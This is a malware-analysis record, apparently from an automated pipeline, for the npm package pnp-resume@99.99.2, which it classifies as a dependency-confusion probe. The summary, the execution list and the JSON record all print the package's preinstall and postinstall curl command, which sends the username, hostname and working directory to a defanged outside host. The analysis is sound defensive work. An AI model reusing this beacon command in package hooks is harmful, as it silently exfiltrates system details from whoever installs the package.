# npm pnp-resume@99.99.2

**Source:** datadog · **Source label:** malicious · **Released:** 2025-06-25 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package runs an inline shell command in both `preinstall` and `postinstall`: one curl GET to hxxp://sl4x0[.]xyz/depconf/pnp-resume/ with the output of `whoami`, `hostname` and `$PWD` in the query string. The response is thrown away, so nothing is downloaded and run. There are no gates: no conditions in the hook commands and no manifest os/cpu/libc restriction. Any install with network access, curl and a POSIX shell sends the beacon.

## Execution

- **preinstall** `curl -s -o /dev/null "hxxp://sl4x0[.]xyz/depconf/pnp-resume/?u=$(whoami)&h=$(hostname)&d=$PWD"`: no package files; inline_shell.
- **postinstall** `curl -s -o /dev/null "hxxp://sl4x0[.]xyz/depconf/pnp-resume/?u=$(whoami)&h=$(hostname)&d=$PWD"`: no package files; inline_shell.

## Gates

None.

## Requirements

- network: sl4x0[.]xyz:80 (Recon data is sent as an HTTP GET to this host.)
- installed_tool: curl, whoami, hostname (The hook command runs curl and uses whoami and hostname in command substitutions.)
- other: POSIX shell for the hook command ($(...) substitution and $PWD need a POSIX shell; under cmd.exe the substitutions are not expanded.)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- Version 99.99.2 and the `depconf` URL path fit a dependency-confusion probe.
- The manifest description ("A simple, benign placeholder") contradicts the install hooks, so it is recorded as misleading text. `index.js` is just a one-line comment and the install never reaches it.
- On Windows under cmd.exe the `$(...)` substitutions would not expand, but curl would still send the request. That is a requirement, not a gate.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "pnp-resume",
    "version": "99.99.2",
    "archive_sha256": "c96786edc9c0d579d291a130ee87bda00df2ae98cb6392c7cac842a0fce73bc3",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-06-25",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2025-06-25-pnp-resume-v99.99.2.zip",
    "package_root": "layer0/tmp/tmp5yghpv5n/pnp-resume/package",
    "cluster_key": "276f9c7ced11343370f21335ed11a740a5306c9f6dae3e64a5728f923fabdda9",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "curl -s -o /dev/null \"hxxp://sl4x0[.]xyz/depconf/pnp-resume/?u=$(whoami)&h=$(hostname)&d=$PWD\"",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      },
      {
        "hook": "postinstall",
        "command": "curl -s -o /dev/null \"hxxp://sl4x0[.]xyz/depconf/pnp-resume/?u=$(whoami)&h=$(hostname)&d=$PWD\"",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "Both hooks run the same inline curl GET that puts whoami, hostname and the install directory ($PWD) in the query string. The response is written to /dev/null, so nothing is fetched and run; launch style changed from download_then_exec to inline_shell.",
      "curl -s hides progress and error text, but the exit code is not discarded, so a failed request still fails the hook; silent_failure left false.",
      "package.json and index.js read in full (index.js is a one-line comment, only reached when loaded, not at install). No other files. No conditions in the hook commands, so no gates.",
      "The manifest description calls the package a simple, benign placeholder, while both install hooks send user, host and path to a remote server."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "sl4x0[.]xyz:80",
      "reason": "Recon data is sent as an HTTP GET to this host."
    },
    {
      "axis": "installed_tool",
      "value": [
        "curl",
        "whoami",
        "hostname"
      ],
      "reason": "The hook command runs curl and uses whoami and hostname in command substitutions."
    },
    {
      "axis": "other",
      "value": "POSIX shell for the hook command",
      "reason": "$(...) substitution and $PWD need a POSIX shell; under cmd.exe the substitutions are not expanded."
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [
      "misleading text"
    ],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxp://sl4x0[.]xyz/depconf/pnp-resume/",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": "depconf curl recon beacon",
  "claude_assessment": "malicious",
  "assessment_reason": "On every install, preinstall and postinstall send the username, hostname and working directory to an external server with curl. The high version number and the depconf path in the URL fit a dependency-confusion probe. Nothing else runs.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
